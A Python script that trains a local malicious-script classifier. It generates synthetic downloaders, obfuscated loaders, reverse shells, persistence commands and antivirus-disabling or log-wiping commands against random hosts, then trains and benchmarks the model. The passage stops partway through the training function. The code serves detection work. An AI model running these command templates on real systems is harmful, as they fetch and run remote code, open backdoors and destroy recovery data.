"""Train (or retrain) the local script classifier and save it as int8.

    uv run python train_ai.py                       # built-in generated samples + scripts found on this PC
    uv run python train_ai.py --benign C:\\my\\clean\\scripts --malicious C:\\samples\\bad   # add your own folders
    one sub-folder per class works too:  --malicious samples/   with  samples/downloader/*.ps1, samples/backdoor/*.sh ...

What it learns from
  * generated malicious-style scripts (6 behaviours, random names / URLs / spacing / case / obfuscation),
  * generated harmless admin scripts, including "near misses" that use the same commands for good reasons,
  * real harmless scripts found on this computer (python, shell, javascript, perl ...),
  * any folders you pass in. THIS IS THE BEST WAY TO IMPROVE IT: add real samples of your own.
It prints accuracy on files the model never saw and the false-alarm rate on harmless real scripts.
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import json
import os
import random
import string
import sys
import time
from pathlib import Path

import numpy as np

import aimodel
from aimodel import FEATURES, LABELS, featurize

HIDDEN = 48
SEED = 7
rnd = random.Random(SEED)


def say(text: str) -> None:
    """Where progress lines go. The command line prints them; the scan service swaps this for its own log."""
    print(text)


# ---------------------------------------------------------------- generators
def word(n=None):
    return "".join(rnd.choice(string.ascii_lowercase) for _ in range(n or rnd.randint(4, 9)))


def ip():
    return ".".join(str(rnd.randint(1, 254)) for _ in range(4))


def url(ext=None):
    host = rnd.choice([ip(), word() + rnd.choice([".com", ".xyz", ".top", ".ru", ".net", ".io"]), "cdn." + word() + ".com"])
    return rnd.choice(["http://", "https://"]) + host + rnd.choice(["", ":8080", ":4444", ":8443"]) + "/" + "/".join(word(rnd.randint(2, 6)) for _ in range(rnd.randint(0, 2))) + "/" + word() + (ext or rnd.choice([".ps1", ".exe", ".bin", ".txt", ".dll", ".jpg", ".sh", ".dat"]))


def path_win():
    return rnd.choice(["$env:TEMP", "$env:APPDATA", "C:\\Users\\Public", "%TEMP%", "%APPDATA%", "C:\\ProgramData"]) + "\\" + word() + rnd.choice([".exe", ".ps1", ".dll", ".vbs", ".bat"])


def case(s):
    return "".join(c.upper() if rnd.random() < 0.3 else c for c in s) if rnd.random() < 0.25 else s


def filler(lang="ps"):
    pool = {
        "ps": ["$ErrorActionPreference = 'SilentlyContinue'", "Write-Host 'done'", "$x = Get-Date", "# update", "Start-Sleep -Seconds %d" % rnd.randint(1, 30), "$ProgressPreference='SilentlyContinue'"],
        "sh": ["#!/bin/bash", "set +e", "sleep %d" % rnd.randint(1, 20), "cd /tmp", "# setup", "export PATH=$PATH:/usr/local/bin"],
        "bat": ["@echo off", "setlocal", "REM run", "timeout /t %d >nul" % rnd.randint(1, 10), "cd %TEMP%"],
        "vbs": ["On Error Resume Next", "Set sh = CreateObject(\"WScript.Shell\")", "' run"],
        "js": ["var a = 1;", "// start", "try {", "} catch (e) {}"],
    }[lang]
    return rnd.sample(pool, rnd.randint(0, 3))


def b64(s, utf16=False):
    return base64.b64encode(s.encode("utf-16-le" if utf16 else "utf-8")).decode()


def mix(lines, lang):
    ls = filler(lang) + lines + filler(lang)
    return ("\n" if rnd.random() < 0.8 else "\r\n").join(ls)


def gen_downloader():
    u, p = url(), path_win()
    return rnd.choice([
        lambda: mix([case(f"IEX (New-Object Net.WebClient).DownloadString('{u}')")], "ps"),
        lambda: mix([f"powershell -nop -w hidden -c \"IEX ((New-Object System.Net.WebClient).DownloadString('{u}'))\""], "ps"),
        lambda: mix([f"Invoke-WebRequest -Uri '{u}' -OutFile \"{p}\"", f"Start-Process \"{p}\""], "ps"),
        lambda: mix([f"(New-Object System.Net.WebClient).DownloadFile('{u}','{p}')", f"& '{p}'"], "ps"),
        lambda: mix([f"certutil -urlcache -split -f {u} {p}", f"start {p}"], "bat"),
        lambda: mix([f"bitsadmin /transfer job /download /priority high {u} {p}", f"{p}"], "bat"),
        lambda: mix([f"curl -s {u} | bash"], "sh"),
        lambda: mix([f"wget -q -O- {u} | sh"], "sh"),
        lambda: mix([f"wget {u} -O /tmp/{word()}", f"chmod +x /tmp/{word()}", f"/tmp/{word()} &"], "sh"),
        lambda: mix([f"curl -o /tmp/.{word()} {u} && chmod 755 /tmp/.{word()} && nohup /tmp/.{word()} >/dev/null 2>&1 &"], "sh"),
        lambda: mix([f"Set x = CreateObject(\"MSXML2.XMLHTTP\")", f"x.Open \"GET\", \"{u}\", False", "x.Send", "Set s = CreateObject(\"ADODB.Stream\")", "s.Type = 1", "s.Open", "s.Write x.responseBody", f"s.SaveToFile \"{p}\", 2", f"CreateObject(\"WScript.Shell\").Run \"{p}\", 0"], "vbs"),
        lambda: mix([f"mshta {u}"], "bat"),
        lambda: mix([f"var x = new ActiveXObject('MSXML2.XMLHTTP'); x.open('GET','{u}',false); x.send(); eval(x.responseText);"], "js"),
        lambda: mix([f"import urllib.request; exec(urllib.request.urlopen('{u}').read())"], "sh"),
        lambda: mix([f"regsvr32 /s /n /u /i:{u} scrobj.dll"], "bat"),
    ])()


def gen_obfuscated():
    inner = f"IEX (New-Object Net.WebClient).DownloadString('{url()}')"
    blob = b64(inner, True)
    parts = list("DownloadString")
    split = "'" + "'+'".join("".join(parts[i:i + 3]) for i in range(0, len(parts), 3)) + "'"
    return rnd.choice([
        lambda: mix([f"powershell -NoP -NonI -W Hidden -Enc {blob}"], "ps"),
        lambda: mix([f"powershell.exe -ExecutionPolicy Bypass -EncodedCommand {blob}"], "bat"),
        lambda: mix([f"$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{b64(inner)}'))", "Invoke-Expression $s"], "ps"),
        lambda: mix([f"$c = {split}", f"$w = New-Object Net.WebClient", f"IEX $w.($c.Replace(\"'\",''))('{url()}')"], "ps"),
        lambda: mix(["$a = " + "+".join(f"[char]{ord(ch)}" for ch in "iex (iwr " + url() + ")"), "& ([scriptblock]::Create($a))"], "ps"),
        lambda: mix(["I`E`X ( N`ew-Ob`ject Net.Web`Client ).Down`loadStr`ing( '" + url() + "' )"], "ps"),
        lambda: mix([f"echo {b64(inner)} | base64 -d | bash"], "sh"),
        lambda: mix([f"eval(atob('{b64(inner)}'));"], "js"),
        lambda: mix([f"eval(unescape('{''.join('%%%02x' % ord(c) for c in inner[:60])}'));"], "js"),
        lambda: mix([f"import base64; exec(base64.b64decode('{b64(inner)}'))"], "sh"),
        lambda: mix([f"$h = '{''.join('%02x' % ord(c) for c in inner)}'", "$b = for($i=0;$i -lt $h.Length;$i+=2){[convert]::ToByte($h.Substring($i,2),16)}", "IEX ([text.encoding]::ASCII.GetString($b))"], "ps"),
        lambda: mix([f"Execute(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108))", f"x = \"{b64(inner)}\""], "vbs"),
        lambda: mix(["import base64, zlib", f"exec(zlib.decompress(base64.b64decode('{b64(inner * 3)}')))"], "sh"),
        lambda: mix([f"exec(__import__('base64').b64decode('{b64(inner)}').decode())"], "sh"),
        lambda: mix([f"$m = New-Object IO.MemoryStream(,[Convert]::FromBase64String('{b64(inner * 4)}'))", "IEX (New-Object IO.StreamReader((New-Object IO.Compression.GzipStream($m,[IO.Compression.CompressionMode]::Decompress)))).ReadToEnd()"], "ps"),
        lambda: mix([f"$k = {rnd.randint(1, 250)}", f"$b = [Convert]::FromBase64String('{b64(inner * 2)}')", "$d = $b | ForEach-Object { $_ -bxor $k }", "IEX ([Text.Encoding]::UTF8.GetString($d))"], "ps"),
        lambda: mix([f"var s = atob('{b64(inner)}'); new Function(s)();"], "js"),
        lambda: mix([f"echo {b64(inner * 2)} | base64 --decode | gunzip | sh"], "sh"),
    ])()


def gen_backdoor():
    h, pt = ip(), rnd.choice([4444, 1337, 9001, 5555, 8080, 31337])
    return rnd.choice([
        lambda: mix([f"bash -i >& /dev/tcp/{h}/{pt} 0>&1"], "sh"),
        lambda: mix([f"nc -e /bin/sh {h} {pt}"], "sh"),
        lambda: mix([f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {h} {pt} >/tmp/f"], "sh"),
        lambda: mix([f"python -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{h}',{pt}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\""], "sh"),
        lambda: mix([f"$c = New-Object System.Net.Sockets.TCPClient('{h}',{pt})", "$s = $c.GetStream()", "[byte[]]$b = 0..65535|%{0}", "while(($i = $s.Read($b, 0, $b.Length)) -ne 0){", "$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i)", "$r = (iex $d 2>&1 | Out-String)", "$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}"], "ps"),
        lambda: mix([f"nc.exe -e cmd.exe {h} {pt}"], "bat"),
        lambda: mix([f"socat TCP:{h}:{pt} EXEC:'bash -li',pty,stderr,setsid,sigint,sane"], "sh"),
        lambda: mix([f"php -r '$s=fsockopen(\"{h}\",{pt});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"], "sh"),
        lambda: mix([f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{h}',{pt});$stream = $client.GetStream();\""], "ps"),
    ])()


def gen_persistence():
    n, p = word(), path_win()
    return rnd.choice([
        lambda: mix([f"schtasks /create /tn \"{n}\" /tr \"{p}\" /sc onlogon /rl highest /f"], "bat"),
        lambda: mix([f"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {n} /t REG_SZ /d \"{p}\" /f"], "bat"),
        lambda: mix([f"New-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name {n} -Value '{p}'"], "ps"),
        lambda: mix([f"copy \"{p}\" \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{n}.exe\""], "bat"),
        lambda: mix([f"(crontab -l 2>/dev/null; echo '@reboot /tmp/.{n}') | crontab -"], "sh"),
        lambda: mix([f"echo '/tmp/.{n} &' >> ~/.bashrc"], "sh"),
        lambda: mix([f"cat > /etc/systemd/system/{n}.service <<EOF", "[Service]", f"ExecStart=/tmp/.{n}", "Restart=always", "[Install]", "WantedBy=multi-user.target", "EOF", f"systemctl enable {n}"], "sh"),
        lambda: mix([f"$a = New-ScheduledTaskAction -Execute '{p}'", "$t = New-ScheduledTaskTrigger -AtLogOn", f"Register-ScheduledTask -TaskName '{n}' -Action $a -Trigger $t -RunLevel Highest"], "ps"),
        lambda: mix([f"wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name=\"{n}\", EventNameSpace=\"root\\cimv2\", QueryLanguage=\"WQL\""], "bat"),
        lambda: mix([f"sc create {n} binPath= \"{p}\" start= auto", f"sc start {n}"], "bat"),
        lambda: mix([f"net user {n} {word(8).capitalize()}{rnd.randint(10, 99)}! /add", f"net localgroup administrators {n} /add"], "bat"),
        lambda: mix([f"New-LocalUser -Name '{n}' -Password (ConvertTo-SecureString '{word(9)}1!' -AsPlainText -Force)", f"Add-LocalGroupMember -Group 'Administrators' -Member '{n}'"], "ps"),
        lambda: mix(["mkdir -p ~/.ssh", f"echo 'ssh-rsa AAAA{word(40)} {n}@{word(5)}' >> ~/.ssh/authorized_keys", "chmod 600 ~/.ssh/authorized_keys"], "sh"),
        lambda: mix([f"echo '/tmp/.{n} &' >> /etc/rc.local", "chmod +x /etc/rc.local"], "sh"),
        lambda: mix([f"reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f", "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes"], "bat"),
        lambda: mix([f"Set-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name {n} -Value 'powershell -w hidden -ep bypass -File {p}'"], "ps"),
    ])()


def gen_evasion():
    return rnd.choice([
        lambda: mix(["Set-MpPreference -DisableRealtimeMonitoring $true", "Set-MpPreference -DisableIOAVProtection $true"], "ps"),
        lambda: mix([f"Add-MpPreference -ExclusionPath '{rnd.choice(['C:\\\\', 'C:\\Users\\Public', '$env:TEMP'])}'"], "ps"),
        lambda: mix(["netsh advfirewall set allprofiles state off"], "bat"),
        lambda: mix(["sc stop WinDefend", "sc config WinDefend start= disabled"], "bat"),
        lambda: mix(["wevtutil cl Security", "wevtutil cl System", "wevtutil cl Application"], "bat"),
        lambda: mix(["[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"], "ps"),
        lambda: mix(["taskkill /f /im MsMpEng.exe", "taskkill /f /im avp.exe", "taskkill /f /im mbam.exe"], "bat"),
        lambda: mix(["history -c", "unset HISTFILE", "export HISTSIZE=0", "rm -f ~/.bash_history", "echo > /var/log/auth.log"], "sh"),
        lambda: mix(["reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"], "bat"),
        lambda: mix(["Set-ExecutionPolicy Bypass -Scope Process -Force", "Disable-WindowsOptionalFeature -Online -FeatureName Windows-Defender"], "ps"),
        lambda: mix(["setenforce 0", "systemctl stop auditd", "service apparmor stop"], "sh"),
        lambda: mix(["vssadmin delete shadows /all /quiet", "wmic shadowcopy delete", "bcdedit /set {default} bootstatuspolicy ignoreallfailures"], "bat"),
        lambda: mix(["bcdedit /set {default} recoveryenabled no", "wbadmin delete catalog -quiet"], "bat"),
        lambda: mix(["fsutil usn deletejournal /d C:", "wevtutil cl Security", "del /f /q %SystemRoot%\\Prefetch\\*.pf"], "bat"),
        lambda: mix(["Get-WinEvent -ListLog * | ForEach-Object { wevtutil cl $_.LogName }", "Remove-Item (Get-PSReadlineOption).HistorySavePath"], "ps"),
        lambda: mix(["Stop-Service -Name WinDefend -Force", "Set-Service -Name WinDefend -StartupType Disabled", "Set-MpPreference -MAPSReporting 0 -SubmitSamplesConsent 2"], "ps"),
    ])()


TRUSTED = ["download.microsoft.com", "download.visualstudio.microsoft.com", "github.com", "www.python.org", "nodejs.org", "dl.google.com", "download.mozilla.org", "get.docker.com",
           "releases.hashicorp.com", "download.documentfoundation.org", "www.7-zip.org", "aka.ms", "objects.githubusercontent.com", "repo.anaconda.com", "cdn.jsdelivr.net"]


def gen_benign():
    d, n = word(), word()
    return rnd.choice([
        lambda: mix([f"$files = Get-ChildItem -Path 'D:\\{d}' -Recurse -Filter *.log", "foreach ($f in $files) {", "  if ($f.Length -gt 10MB) { Write-Host $f.FullName }", "}"], "ps"),
        lambda: mix([f"Copy-Item -Path 'C:\\Data\\{d}' -Destination 'E:\\Backup\\{n}' -Recurse -Force", "Write-Host 'Backup finished'"], "ps"),
        lambda: mix(["$s = Get-Service | Where-Object {$_.Status -eq 'Running'}", "$s | Select-Object Name, DisplayName | Export-Csv services.csv -NoTypeInformation"], "ps"),
        lambda: mix([f"Test-Connection -ComputerName {d}.local -Count 2", "Get-NetIPConfiguration | Format-Table"], "ps"),
        lambda: mix([f"$r = Invoke-RestMethod -Uri 'https://api.github.com/repos/{d}/{n}/releases/latest'", "Write-Host $r.tag_name"], "ps"),
        lambda: mix([f"Invoke-WebRequest -Uri 'https://{d}.com/docs/manual.pdf' -OutFile \"$env:USERPROFILE\\Documents\\manual.pdf\"", "Write-Host 'saved the manual'"], "ps"),
        lambda: mix(["schtasks /query /fo LIST /v", "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall"], "bat"),
        lambda: mix(["netsh advfirewall show allprofiles", "ipconfig /all", "netstat -ano | findstr LISTENING"], "bat"),
        lambda: mix([f"robocopy C:\\Users\\Me\\Documents D:\\Backup\\{d} /MIR /R:2 /W:2", "echo backup complete"], "bat"),
        lambda: mix(["echo Cleaning temp files", "del /q /f %TEMP%\\*.tmp", "rd /s /q %TEMP%\\cache", "echo done"], "bat"),
        lambda: mix([f"curl -s https://api.{d}.com/v1/status | jq '.status'"], "sh"),
        lambda: mix([f"tar czf /backup/{d}-$(date +%F).tar.gz /home/{n}", "echo backup ok"], "sh"),
        lambda: mix([f"for f in *.jpg; do convert \"$f\" -resize 50% \"small_$f\"; done"], "sh"),
        lambda: mix(["apt-get update && apt-get install -y git curl build-essential", "git clone https://github.com/" + d + "/" + n + ".git"], "sh"),
        lambda: mix([f"systemctl status {d}", "journalctl -u " + d + " --since today | tail -50"], "sh"),
        lambda: mix([f"docker build -t {d}:latest .", f"docker run -d -p 8080:80 {d}:latest"], "sh"),
        lambda: mix([f"const express = require('express');", "const app = express();", f"app.get('/{d}', (req, res) => res.json({{ok: true}}));", "app.listen(3000);"], "js"),
        lambda: mix([f"document.getElementById('{d}').addEventListener('click', () => {{", f"  fetch('/api/{n}').then(r => r.json()).then(data => console.log(data));", "});"], "js"),
        lambda: mix([f"import os, json", f"def load(path):", "    with open(path) as f:", "        return json.load(f)", f"print(load('{d}.json'))"], "sh"),
        lambda: mix([f"Dim fso: Set fso = CreateObject(\"Scripting.FileSystemObject\")", f"If fso.FileExists(\"C:\\{d}.txt\") Then WScript.Echo \"found\""], "vbs"),
        lambda: mix([f"echo {b64('hello ' + d)} | base64 -d > /tmp/{n}.txt"], "sh"),
        lambda: mix([f"$logo = [Convert]::FromBase64String('{b64(d * 20)}')", f"[IO.File]::WriteAllBytes('logo.png', $logo)"], "ps"),
        lambda: mix([f"Set-Location C:\\Projects\\{d}", "git pull", "npm install", "npm run build"], "ps"),
        lambda: mix([f"schtasks /create /tn \"Backup {d}\" /tr \"C:\\Scripts\\backup.bat\" /sc daily /st 02:00"], "bat"),
        lambda: mix([f"$u = 'https://{rnd.choice(TRUSTED)}/{word()}/{word()}-setup.exe'", f"$o = \"$env:TEMP\\{word()}-setup.exe\"", "Invoke-WebRequest -Uri $u -OutFile $o", f"Start-Process $o -ArgumentList '{rnd.choice(['/quiet', '/S', '/silent /norestart', '/VERYSILENT'])}' -Wait"], "ps"),
        lambda: mix([f"(New-Object System.Net.WebClient).DownloadFile('https://{rnd.choice(TRUSTED)}/{word()}.msi', 'C:\\Installers\\{n}.msi')", f"msiexec /i C:\\Installers\\{n}.msi /qn /norestart"], "ps"),
        lambda: mix([f"curl -fsSL https://{rnd.choice(TRUSTED)}/{word()}.tar.gz -o /tmp/{n}.tar.gz", f"tar -xzf /tmp/{n}.tar.gz -C /opt", f"echo installed {n}"], "sh"),
        lambda: mix([f"wget https://{rnd.choice(TRUSTED)}/{word()}-linux-x64.tar.xz", f"sha256sum -c {n}.sha256", f"tar -xf {word()}-linux-x64.tar.xz -C /opt"], "sh"),
        lambda: mix([f"winget install --id {rnd.choice(['Git.Git', 'Python.Python.3.12', 'Microsoft.VisualStudioCode', 'Mozilla.Firefox', '7zip.7zip'])} -e", f"choco install {word()} -y"], "bat"),
        lambda: mix([f"Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '{d}' -Value '\"C:\\Program Files\\{n.capitalize()}\\{d}.exe\" --minimized'"], "ps"),
        lambda: mix([f"reg add HKCU\\Software\\{n} /v Setting /t REG_SZ /d {d} /f", f"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {n} /t REG_SZ /d \"C:\\Program Files\\{n}\\{d}.exe\" /f"], "bat"),
        lambda: mix([f"powershell.exe -NoProfile -WindowStyle Hidden -File \"C:\\Program Files\\{n.capitalize()}\\Agent\\{d}.ps1\"", "exit 0"], "bat"),
        lambda: mix(["Import-Module ActiveDirectory", f"Get-ADUser -Filter * -SearchBase 'OU={d},DC=corp,DC=local' | Export-Csv {n}.csv"], "ps"),
        lambda: mix([f"net user {n} /domain", "net group \"Domain Admins\" /domain"], "bat"),
        lambda: mix([f"New-Item -ItemType Directory -Path C:\\{d}", f"icacls C:\\{d} /grant 'Users:(OI)(CI)R'"], "ps"),
        lambda: mix([f"msiexec /i \"C:\\Installers\\{d}.msi\" /qn /norestart"], "bat"),
        lambda: mix([f"ssh {n}@10.0.{rnd.randint(0, 9)}.{rnd.randint(2, 200)} 'sudo systemctl restart {d} && systemctl status {d} --no-pager'"], "sh"),
    ])()


GENS = {"benign": gen_benign, "downloader": gen_downloader, "obfuscated": gen_obfuscated, "backdoor": gen_backdoor, "persistence": gen_persistence, "evasion": gen_evasion}

PROSE = ["The quick brown fox jumps over the lazy dog.", "Meeting notes: we discussed the quarterly roadmap and assigned owners for each item.", "Dear team, please find the attached report for last month. Let me know if anything is unclear.", "Installation: unzip the archive, run the setup program and follow the prompts.", "{\"name\": \"app\", \"version\": \"1.2.3\", \"scripts\": {\"build\": \"tsc\"}}", "<html><head><title>Home</title></head><body><h1>Welcome</h1><p>Hello world</p></body></html>", "body { margin: 0; font-family: sans-serif; } .card { padding: 16px; border: 1px solid #ccc; }", "[settings]\nlanguage=en\nautosave=true\ntheme=dark"]


def real_benign(extra: list[Path]) -> list[tuple[str, str]]:
    """Harmless scripts that already exist on this computer, as (group, text). Group = the file path, used to split train/test."""
    roots = [Path(p) for p in ("/usr/lib/python3", "/usr/share", "/usr/bin", "/etc", "/usr/lib/node_modules")] + [Path(__file__).resolve().parents[2] / "frontend" / "node_modules"] + extra
    if os.name == "nt":
        # harmless scripts that come with Windows and with installed programs
        system = Path(os.environ.get("SystemRoot", r"C:\Windows"))
        roots += [system / "System32" / "WindowsPowerShell", system / "System32" / "Printing_Admin_Scripts",
                  Path(os.environ.get("ProgramFiles", r"C:\Program Files")) / "nodejs",
                  Path(os.environ.get("ProgramFiles", r"C:\Program Files")) / "Git" / "etc"]
    exts = {".py", ".sh", ".js", ".pl", ".rb", ".bash", ".ps1", ".bat", ".cmd", ".vbs", ".txt", ".md", ".json", ".html", ".css", ".conf"}
    out: list[tuple[str, str]] = []
    for root in roots:
        if not root.exists():
            continue
        n = 0
        for p in root.rglob("*"):
            if n >= 700:
                break
            try:
                if p.suffix.lower() in exts and p.is_file() and 80 < p.stat().st_size < 400_000 and "test" not in p.name.lower():
                    t = p.read_text("utf-8", "ignore")
                    if t.count("\x00") == 0 and len(t.strip()) > 80:
                        out.append((str(p), t[:6000]))
                        n += 1
            except OSError:
                continue
    return out


def read_folder(folder: Path, label_of_root: str) -> list[tuple[str, str, str]]:
    out = []
    for p in folder.rglob("*"):
        if p.is_file() and p.stat().st_size < 400_000:
            label = p.parent.name if p.parent.name in LABELS and p.parent != folder else label_of_root
            try:
                out.append((label, str(p), p.read_text("utf-8", "ignore")[:6000]))
            except OSError:
                pass
    return out


# ---------------------------------------------------------------- training
def dense(batch, idx_val):
    X = np.zeros((len(batch), FEATURES), dtype=np.float32)
    for r, i in enumerate(batch):
        idx, val = idx_val[i]
        X[r, idx] = val
    return X


def gpu_available() -> bool:
    """True when CuPy (NumPy on an NVIDIA graphics card) is installed AND a card is present.
    The packaged app does not bundle CuPy (it is ~1 GB), so on most PCs this is False and training uses the CPU."""
    try:
        import cupy  # noqa: F401

        return cupy.cuda.runtime.getDeviceCount() > 0
    except Exception:
        return False


def train(samples, epochs=25, lr=0.01, seed=0, throttle=0.0, gpu=False):
    """Train the 2-layer classifier.

    gpu       use the graphics card through CuPy when it is available (same maths, much faster)
    throttle  0 = full speed. 0.5 = after every step rest as long as the step took, so the work uses about
              half of the processor. Used for the training that runs by itself in the background.
    """
    if gpu and gpu_available():
        import cupy as xp

        say("  using the graphics card (GPU)")
        on_gpu = True
    else:
        xp, on_gpu = np, False
    r = np.random.default_rng(seed)
    iv = [featurize(t) for _, t in samples]
    y = xp.asarray(np.array([LABELS.index(l) for l, _ in samples]))
    n, C = len(samples), len(LABELS)
    W1 = xp.asarray((r.standard_normal((FEATURES, HIDDEN)) * np.sqrt(2.0 / 64)).astype(np.float32))
    b1 = xp.zeros(HIDDEN, np.float32)
    W2 = xp.asarray((r.standard_normal((HIDDEN, C)) * np.sqrt(2.0 / HIDDEN)).astype(np.float32))
    b2 = xp.zeros(C, np.float32)
    params = [W1, b1, W2, b2]
    m = [xp.zeros_like(p) for p in params]
    v = [xp.zeros_like(p) for p in params]
    t = 0
    # class weights: errors on "benign" cost more, so harmless scripts are not called dangerous
    cw = np.ones(C, np.float32)
    cw[0] = 2.0
    cw = xp.asarray(cw)
    rest = throttle / (1.0 - throttle) if 0 < throttle < 1 else 0.0
    for ep in range(epochs):
        order = r.permutation(n)
        loss_sum = 0.0
        for s in range(0, n, 64):
            started = time.perf_counter()
            b = order[s:s + 64]
            X = xp.asarray(dense(b, iv))
            h_pre = X @ W1 + b1
            h = xp.maximum(h_pre, 0)
            # light dropout on the hidden layer
            mask = xp.asarray((r.random(tuple(h.shape)) > 0.1).astype(np.float32) / 0.9)
            hd = h * mask
            z = hd @ W2 + b2
            z -= z.max(1, keepdims=True)
            p = xp.exp(z)
            p /= p.sum(1, keepdims=True)
            yy = y[xp.asarray(b)]
            rows = xp.arange(len(b))
            loss_sum += float(-(xp.log(p[rows, yy] + 1e-9) * cw[yy]).sum())
            dz = p.copy()
            dz[rows, yy] -= 1
            dz *= cw[yy][:, None] / len(b)
            gW2 = hd.T @ dz
            gb2 = dz.sum(0)
            dh = (dz @ W2.T) * mask * (h_pre > 0)
            gW1 = X.T @ dh + 1e-5 * W1
            gb1 = dh.sum(0)
            t += 1
            for k, (pa, g) in enumerate(zip(params, [gW1, gb1, gW2, gb2])):
                m[k] = 0.9 * m[k] + 0.1 * g
                v[k] = 0.999 * v[k] + 0.001 * g * g
                pa -= lr * (m[k] / (1 - 0.9 ** t)) / (xp.sqrt(v[k] / (1 - 0.999 ** t)) + 1e-8)
            if rest:
                time.sleep((time.perf_counter() - started) * rest)   # background mode: leave the other half to the user
        if ep % 5 == 4 or ep == epochs - 1:
            say(f"  epoch {ep + 1:2d}/{epochs}  loss {loss_sum / n:.4f}")
    out = [x.get() if on_gpu else x for x in (W1, b1, W2, b2)]
    return tuple(out)


def quantize(W: np.ndarray):
    s = np.abs(W).max(axis=0) / 127.0
    s[s == 0] = 1.0
    return np.clip(np.round(W / s), -127, 127).astype(np.int8), s.astype(np.float32)


def save(W1, b1, W2, b2, path: Path, temp: float = 1.0):
    q1, s1 = quantize(W1)
    q2, s2 = quantize(W2)
    path.parent.mkdir(parents=True, exist_ok=True)
    np.savez_compressed(path, w1=q1, s1=s1, b1=b1, w2=q2, s2=s2, b2=b2, labels=np.array(LABELS), temp=np.float32(temp))


def fit_temperature(model, val) -> float:
    """Softening factor T that makes the model's confidence match how often it is right on data it never trained on
    (minimises the log-loss of softmax(logits / T) on the validation set)."""
    if len(val) < 30:
        return 1.0
    Z, y = [], []
    for lab, t in val:
        idx, v = featurize(t)
        Z.append(model.logits(idx, v))
        y.append(LABELS.index(lab))
    Z, y = np.asarray(Z), np.asarray(y)
    best, best_loss = 1.0, 1e9
    for T in np.arange(1.0, 4.01, 0.1):                  # only ever SOFTEN: never make the model more confident than it was trained to be
        zz = Z / T
        zz = zz - zz.max(1, keepdims=True)
        p = np.exp(zz)
        p /= p.sum(1, keepdims=True)
        loss = float(-np.log(p[np.arange(len(y)), y] + 1e-9).mean())
        if loss < best_loss:
            best, best_loss = float(T), loss
    return round(best, 2)


def benchmark(model) -> dict:
    """Score the model on the 60 hand-written scripts in ai_benchmark.py (never used for training), with the same rule the app uses:
    a script counts as flagged when the model says it is not benign with at least 85% confidence."""
    import ai_benchmark

    fa, miss, bad_rows = 0, 0, []
    for lab, t in ai_benchmark.ALL:
        r = model.predict(t)
        flagged = r["label"] != "benign" and r["confidence"] >= 0.85
        if lab == "benign" and flagged:
            fa += 1
            bad_rows.append(("FALSE ALARM", r["label"], round(r["confidence"], 2), t[:60].replace("\n", " ")))
        elif lab == "malicious" and not flagged:
            miss += 1
            bad_rows.append(("MISSED", r["label"], round(r["confidence"], 2), t[:60].replace("\n", " ")))
    nb, nm = len(ai_benchmark.BENIGN), len(ai_benchmark.MALICIOUS)
    for row in bad_rows:
        say("    " + " | ".join(str(x) for x in row))
    return {"benchmark_benign": nb, "benchmark_malicious": nm, "benchmark_false_alarms": fa, "benchmark_missed": miss,
            "benchmark_accuracy": round(100 * (nb + nm - fa - miss) / (nb + nm), 1)}


def evaluate(model, samples, title):
    ok = 0
    conf = np.zeros((len(LABELS), len(LABELS)), int)
    for l, t in samples:
        pred = model.predict(t)["label"]
        conf[LABELS.index(l), LABELS.index(pred)] += 1
        ok += pred == l
    say(f"{title}: {ok}/{len(samples)} correct ({100 * ok / max(len(samples), 1):.1f}%)")
    return conf


def run_training(benign=None, malicious=None, per_class=900, epochs=25, out=None, seed=SEED, log=None, throttle=0.0, gpu=False) -> dict:
    """Train the classifier and save it as int8. Returns a small report (also written next to the model as train_info.json).

    benign / malicious : extra folders of real samples (optional)
    out                : where to write the .npz (default: the model shipped with the app)
    seed               : same seed = same weights; the scan service passes a new seed so a retrain really changes them
    log                : function that receives progress lines
    throttle           : 0.5 = use about half of the processor (background training)
    gpu                : use the graphics card when CuPy and a card are present
    """
    global say
    if log is not None:
        say = log
    rnd.seed(seed)
    out_path = Path(out) if out else aimodel.BUNDLED_MODEL

    samples: list[tuple[str, str]] = []
    for lab, g in GENS.items():
        k = per_class * (2 if lab == "benign" else 1)
        samples += [(lab, g()) for _ in range(k)]
    samples += [("benign", rnd.choice(PROSE) + "\n" + rnd.choice(PROSE)) for _ in range(150)]
    real = real_benign([Path(p) for p in (benign or [])])
    say(f"generated {len(samples)} samples, {len(real)} real harmless files found on this computer")
    for folder in (malicious or []):
        for lab, _, text in read_folder(Path(folder), "downloader"):
            samples.append((lab, text))
    # real harmless files: split by file so the test set is files the model never saw
    rnd.shuffle(real)
    cut = int(len(real) * 0.8)
    real_train, real_test = real[:cut], real[cut:]
    samples += [("benign", t) for _, t in real_train]
    # drop exact duplicates, so the same text can never sit in both the training and the test part
    seen: set[str] = set()
